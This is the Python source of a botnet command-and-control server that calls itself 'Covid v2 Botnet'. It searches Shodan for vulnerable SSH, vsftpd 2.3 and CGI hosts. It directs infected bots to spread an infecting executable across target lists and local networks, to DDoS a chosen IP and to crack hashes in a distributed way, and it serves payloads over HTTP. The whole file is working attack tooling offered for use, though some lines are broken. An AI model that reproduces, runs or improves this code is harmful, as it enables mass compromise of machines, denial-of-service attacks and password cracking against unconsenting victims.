#!/usr/bin/python3
import socket
import threading
import time
import os
import subprocess
from hash_identify import *
import re
import attack_list
import local_network_attack
import json
import os
import signal
import shodan
from termcolor import colored
import pyfiglet

#configure:
API_KEY = "" #shodan api key
executable="executable to infect with"
wordlist_len=0# wordlist length
cnc_ip = "your cnc ip"
cnc_port = 8080 #your cnc ip port, default is 8080
#############################################################################
global bots 
bots = []
global waiting
waiting = False
global cracking
cracking = False
global targets
targets=[]
logs = []
global local_attack_var
local_attack_var=None
global list_attack_var
list_attack_var = None
global serv
serv = None
global pid
pid = None

class bot(): #bot class to save in bots list
	def __init__(self,addr,port,id_num,status=True):
		self.addr = addr
		self.port = port
		self.id_num = id_num
		self.status = status
	@classmethod
	def from_json(self,json_data):
		return bot(json_data['addr'],json_data['port'],json_data['id_num'],False)
	def setOnline(self):
		self.status = True
	def setOffline(self):
		self.status = False
	def to_string(self):
		return "id: %s addr: %s port: %s status: %s" % (self.id_num,self.addr,self.port,self.status)
	def dump(self):
		return {'addr':self.addr,'port':self.port,'id_num':self.id_num}

########### utils ################################

def get_work(workers, leng=wordlist_len): #returns work array for workers length
		res = leng / workers
		start = 0
		end = int(res)
		lst = []
		for i in range(workers):
			to_append = [int(start),int(end)]
			lst.append(to_append)
			end += int(res)
			start += int(res)
			if (i == (workers - 1)):
				if (lst[len(lst)-1][1] != leng):
					lst.append([start,leng])
		return lst

def waiting_cmd():
	global waiting
	if waiting:
		print("\n>>> ",end = '')
		
def get_online_bots():
	global bots
	leng = 0
	for bot in bots:
		if bot.status == True:
			leng +=1
	return leng
	
def get_online_bots_lst():
	global bots
	ret = []
	for bot in bots:
		if bot.status == True:
			ret.append(bot)
	return ret

########### return messages analayze: ###############

def infected(message,conn,addr): #incoming infection
	global bots
	arr = message.split(" ")
	port = int(arr[1])
	addr = addr[0]
	#addr,public_addr,port,id_num,status
	print(colored(("new infection connection from: %s %s" % (addr,port)),'green'))
	if not infectedip(addr,port):
		b = bot(addr, port, len(bots))
		bots.append(b)
		conn.send(str(len(bots) -1).encode())
		conn.close()
	else:
		for b in bots:
			if b.addr == addr:
				conn.send(str(b.id_num).encode())
				conn.close()
				b.setOnline()
				return
		conn.send("hey, too much".encode())
		conn.close()
	
def analyze_scan(message,conn,addr):
	print(message)
	conn.close()
	
def pong(conn,addr):
	conn.send("pong".encode())
	conn.close()
	
########### commands: ###################

def show_targets(): #prints targets
	global targets
	index = 1
	print(colored(("--------------%s targets:------------" % (len(targets))),'blue'))
	for target in targets:
		print(colored(("[%s] %s"%(index,target)),'blue'))
		index +=1
		
def valid_ip(addr): #checks if the ip is valid
	regex = '''^(25[0-5]|2[0-4][0-9]|[0-1]?[0-9][0-9]?)\.( 
				25[0-5]|2[0-4][0-9]|[0-1]?[0-9][0-9]?)\.( 
				25[0-5]|2[0-4][0-9]|[0-1]?[0-9][0-9]?)\.(    
				25[0-5]|2[0-4][0-9]|[0-1]?[0-9][0-9]?)$'''
	return re.search(regex, addr)
	
def add_targets(): #gets ips to insert to targets
	global targets
	global waiting
	waiting=True
	addr = input("enter target ip or list of ips (ip,ip) \n>>> ")
	if "," in addr:
		try:
			lst = addr.split(",")
			for addr in lst:
				if valid_ip(addr) and not infectedip(addr) and addr not in targets:
					targets.append(addr)
				else:
					print(colored(("target %s is infected or not a real ip address..." % (addr)),'yello'))
		except:
			print(colored("invalid syntax of list",'red'))
	else:	
		if not infectedip(addr) and valid_ip(addr) and addr not in targets:
			targets.append(addr)
		else:
			print(colored("target %s is infected or not a real ip address...",'yellow') % (addr))
	show_targets()
			
def clean_targets(): #deletes targets
	global targets
	res = input("there are %s targets, you sure you want to remove them? [Y/n]")
	if res.lower() == 'n':
		return
	targets = []

def search_targets(): #shodan targets search
	global targets
	global bots
	try:
		api = shodan.Shodan(API_KEY)
		query = "ssh port:22"
		result = api.search(query)
		ip_list = []
		for service in result['matches']:
			ip_list.append(service['ip_str'])
		query = "vsftpd 2.3 port:21"
		result = api.search(query)
		for service in result['matches']:
			ip_list.append(service['ip_str'])
		query = "http cgi port:80"
		result = api.search(query)
		for service in result['matches']:
			ip_list.append(service['ip_str'])
		for ip in targets:
			if ip in ip_list:
				ip_list.remove(ip)
		for bot in bots:
			if bot.public_addr in ip_list:
				ip_list.remove(bot.public_addr)
		inp = input("Found %s new targets, do you want to add them? [Y/n]" % len(ip_list))
		if inp == "n":
			return
		targets = ip_list
	except Exception as e:
		print("error: %s" % str(e))
		return
		
def infectedip(addr,port=0): #check if ip is infected
	global bots
	for bot in bots:
		if port==0:
			return bot.addr == addr
		if bot.addr == addr and bot.port == port:
			return True
	return False

def ping(bot): #send ping to a bot
	try:
		sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		sock.connect((bot.addr, bot.port))
		sock.settimeout(5.0)
		sock.send("ping".encode())
		data = sock.recv(1024)
		sock.close()
		msg = data.decode('utf-8').strip('\r\n')
		if msg == "pong":
			return True
		else:
			return False
	except:
		return False
	
def check_alive(): #pinging bots to check who is alive
	global bots
	for i in bots:
		print(colored(("\n[*] checking bot %s" % (i.to_string())),'yellow'))
		if not ping(i):
			print(colored(("[-] bot offline %s" % (i.to_string())),'red'))
			i.setOffline()
		else:
			print(colored(("[+] bot online %s" % (i.to_string())),'green'))
			i.setOnline()

def bots_status(): #prints bots list
	global bots
	if not bots:
		return colored("\n[-] no bots :( ... \n",'yellow')
	l = colored('\n---bots:\n','blue')
	for i in bots:
			l += colored(("[+] %s" % (i.to_string())),'blue')
			l += colored('\n','blue')
	return l

def help(): #prints help message
	menu = colored('\n--menu:\n','green')
	menu += colored("[+] {status}: show bots status\n",'green')
	menu += colored("[+] {update}: pings each bot and checks for status\n",'green')
	menu += colored("[+] {show targets}: shows the target list \n",'green')
	menu += colored("[+] {add targets}: add targets to the target list \n",'green')
	menu += colored("[+] {search targets}: searches targets from shodan\n",'green')
	menu += colored("[+] {clear targets}: clears the target list \n",'green')
	menu += colored("[+] {crack}: uses the bots to crack a hash\n",'green')
	menu += colored("[+] {ddos}: uses the bots to ddos a given ip\n",'green')
	menu += colored("[+] {list attack}: give bots and server (if selected so) targets from target list to attack\n",'green')
	menu += colored("[+] {stop list attack}: commands the bots and server to stop running list attack \n",'green')
	menu += colored("[+] {local attack}: sends bots and server (if selected so) command to attack all ips on local network\n",'green')
	menu += colored("[+] {stop local attack}: commands the bots and server to stop running local attack \n",'green')
	menu += colored("[+] {exit()}: closes server, saves the target list and bots list\n",'green')
	menu += colored("[+] {help}: print this menu\n",'green')
	return menu

def crack(): #start hash cracking
	global bots
	global cracking
	global waiting
	if cracking:
		print("a cracking progress is still on, wait for it ti finish")
		return
	check_alive()
	workers_len = get_online_bots()
	if workers_len == 0:
		print("no bots online")
		return
	waiting=True
	hash_str = input("enter a hash to crack \n>>> ")
	res = check_hash(hash_str)
	if "hash not avialbe" in res:
		print(res)
		return
	print("possible hashes:")
	for i in range(len(res)):
			print("[%s] %s" % (i+1,res[i]))
	while True:
		hash_type = input("enter a hash number or different hash name (enter exit to exit) \n>>> ")
		if hash_type == "exit":
			return
		if len(hash_type) == 1:
			if ord(hash_type) >= 48 and ord(hash_type) <= 57 and ((ord(hash_type) - 49) < len(res)) and ((ord(hash_type) - 49) >= 0):
				hash_type = res[ord(hash_type) - 49]
		if not hash_type in hashlib.algorithms_available:
			print("hash not avialbe or index out of range")
		else:
			break
	print("chosen type:",hash_type)
	cracking = True
	job = get_work(workers_len)
	for i in range(workers_len):
		cmd = "crack %s %s %s %s" % (hash_str, hash_type,job[i][0], job[i][1])
		send_message(bots[i],cmd)
	
def stop_cracking():
	global bots
	global cracking
	for bot in bots:
		send_message(bot, "stop crack")
	cracking = False
	
def local_attack(): #handeling local attack
	global local_attack_var
	inpt = input("including me? [N/y]")
	include = False
	if inpt.lower() == 'y':
		if local_attack_var:
			if local_attack_var.status:
				print(colored("im attacking right now... ",'yellow'))
			else:
				include=True
		else:
			include = True
	check_alive()
	global bots
	for bot in bots:
		send_message(bot,"local attack")
	if include:
		local_attack_var = local_network_attack
		x = threading.Thread(target=local_attack_var.scan_and_attack, args=(cnc_ip,cnc_port,executable,True,False,"server"))
		x.setDaemon(True)
		x.start()

def stop_local_attack(): 
	check_alive()
	global bots
	global local_attack_var
	if local_attack_var:
		local_attack_var.stop()
	for bot in bots:
		send_message(bot,"stop local attack")

def list_attack(): #give bots targets to attack from the list
	global targets
	global bots
	global list_attack_var
	check_alive()
	workers_len = get_online_bots()
	include=False
	if len(targets) <=0:
		print(colored("WTF no targets! add some targets!",'red'))
		return
	inpt = input("including me? [N/y]")
	if inpt.lower() == 'y':
		if list_attack_var:
			if list_attack_var.status:
				print(colored("im attacking right now... ",'yellow'))
			else:
				workers_len += 1
				include=True
		else:
			workers_len += 1
			include=True
	if workers_len <= 0:
		print(colored("no attack can be done because there are no workers!",'red'))
		return
	if len(targets) <= workers_len:
		leng = len(targets)
		if include:
			leng -=1
		index = 0
		if bots != []:
			for i in targets:
				if bots[index].status:
					send_message(bots[index],"list attack %s" % i)
					index +=1
		if index >= len(targets):
			return
		if include:
			list_attack_var=attack_list
			x = threading.Thread(target=list_attack_var.attack_list, args=(targets[len(targets) -1 ],cnc_ip,cnc_port,executable,False,False,"server"))
			x.setDaemon(True)
			x.start()
			
	else:	
		job = get_work(workers_len,len(targets))
		leng = len(job)
		ret = get_online_bots_lst()
		if include:
			leng -=1
		for i in range(leng):
			lst_to_send = []
			for j in range(job[i][0],job[i][1]):
				lst_to_send.append(targets[j])
			index = i
			send_message(ret[i],"list attack %s" % (','.join(lst_to_send)))
		if include:
			lst_to_send=[]
			for i in range(job[leng][0],job[leng][1]):
				lst_to_send.append(targets[i])
			list_attack_var = attack_list
			x = threading.Thread(target=list_attack_var.attack_list, args=(lst_to_send,cnc_ip,cnc_port,executable,False,False,"server"))
			x.setDaemon(True)
			x.start()
	targets = []
		
def stop_list_attack():
	global bots
	for bot in bots:
		send_message(bot,"stop list attack")
	global list_attack_var
	if list_attack_var:
		list_attack_var.stop()
		
def ddos(): #sends bots to start ddos attack on spesific ip
	global bots
	target = input("[*] enter the ip you want to KILL: ",)
	if valid_ip(target):
		check_alive()
		for bot in bots:
			send_message(bot,"ddos %s" % target)
	else:
		print(color("[-] ERROR: not a valid ip!",'red'))
		
def stop_ddos():		
	global bots
	check_alive()
	for bot in bots:
		send_message(bot,"stop ddos")
	print(colored("[+] sent the bots stop command",'green'))
############## server settings: ####################

def send_message(bot, msg): #sends  message to a given bot
	if bot.status == True:
		try:
			sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			sock.connect((bot.addr, bot.port))
			sock.send(msg.encode())
			sock.close()
		except:
			print(colored("[-] error sending message %s to bot %s" % (msg, bot.id_num)),'red')

def on_message(message,conn,addr): #handle new message
	print(colored(("\n\n[+] got message %s %s %s" % (message,"from",addr)),'blue'))
	if message.startswith("infected:"):
		infected(message,conn,addr)
	elif message.startswith("scan resaults:"):
		analyze_scan(message,conn,addr)
	elif message.startswith("cracked"):
		stop_cracking()
	elif message == "ping":
		pong(conn,addr)
	else:
		pass
	waiting_cmd()

def listening_loop(serv): #loop to recive new messages
	while True:
		conn, addr = serv.accept()
		data = conn.recv(1024)
		if not data: 
			break
		msg = data.decode('utf-8').strip('\r\n')
		x = threading.Thread(target=on_message, args=(msg,conn,addr))
		x.start()

def listen(): #starts the cnc server and simplehttpserver
	global serv
	serv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	serv.bind((cnc_ip, cnc_port))
	serv.listen(1)
	res = pyfiglet.figlet_format("Covid v2 Botnet",font = "slant") 
	print(colored(res,'green'))
	print(colored(("[+] started a new server on: %s %s" % (serv.getsockname()[0], serv.getsockname()[1])),'green'))
	PORT = 80
	devnull = open(os.devnull, 'w')
	pro = subprocess.Popen(["python","-m","SimpleHTTPServer",str(PORT),">","/dev/null", "2>&1"],stdout=devnull,stderr=devnull)
	global pid
	pid = pro.pid
	print(colored(("[+] started the simple http server at port %s" % PORT),'green'))
	x = threading.Thread(target=listening_loop, args=(serv,))
	x.setDaemon(True)
	x.start()
	
def load_targets(): #loads targets from targets.json
	global targets
	try:
		with open("targets.json",'r',encoding='utf-8') as f:
			data = json.loads(f.read())
			for i in data:
				targets.append(i)
		print(colored(('[+] loaded %s targets'%len(targets)),'green'))
	except:
		print(colored("[-] error in loading targets",'yellow'))
def save_targets():	#saves targets to targets.json
	global targets
	try:
		with open("targets.json",'w') as f:
			json.dump(targets,f)
		print(colored('[+] saved targets','green'))
	except:
		print(colored('[-] error in saving targets','red'))
def load_bots(): #loads bots from bots.json
	global bots
	try:
		with open("bots.json",'r',encoding='utf-8') as f:
			data = json.loads(f.read())
			for i in data:
				bots.append(bot.from_json(i))
		check_alive()
		print(colored(('[+] bots online: %s'%get_online_bots()),'green'))
	except:
		print(colored("[-] error in loading bots",'yellow'))

def save_bots(): #saves bots to bots.json
	global bots
	try:
		with open("bots.json",'w') as f:
			json.dump([o.dump() for o in bots],f)
		print(colored(("[+] saved %s bots" %len(bots)),'green'))
	except:
		print(colored('[-] error saving bots!','red'))

############## main controller: ####################3

def main():
	global waiting
	listen() $ #start server
	load_bots()
	load_targets() 
	while True:
		waiting = True
		command = input("whats your next command :} ? (type help for menu) \n>>> ")
		if len(command) > 1:
			waiting = False
			if command == "help":
				print(help())
			elif command == "status":
				print(bots_status())
			elif command == "update":
				check_alive()
				print(bots_status())
			elif command == "crack":
				crack()
			elif command == "stop crack":
				stop_cracking()
			elif command == "show targets":
				show_targets()
			elif command == "add targets":
				add_targets()
			elif command == "local attack":
				local_attack()
			elif command == "stop local attack":
				stop_local_attack()
			elif command == "list attack":
				list_attack()
			elif command == "stop list attack":
				stop_list_attack()
			elif command == "search targets":
				search_targets()
			elif command == "clean targets":
				clean_targets()
			elif command == "ddos":
				ddos()
			elif command == "stop ddos":
				stop_ddos()
			elif command == "exit()":
				save_bots()
				save_targets()
				global serv
				serv.close()
				global pid
				os.killpg(os.getpgid(pid), signal.SIGTERM)
				exit()
	
main()
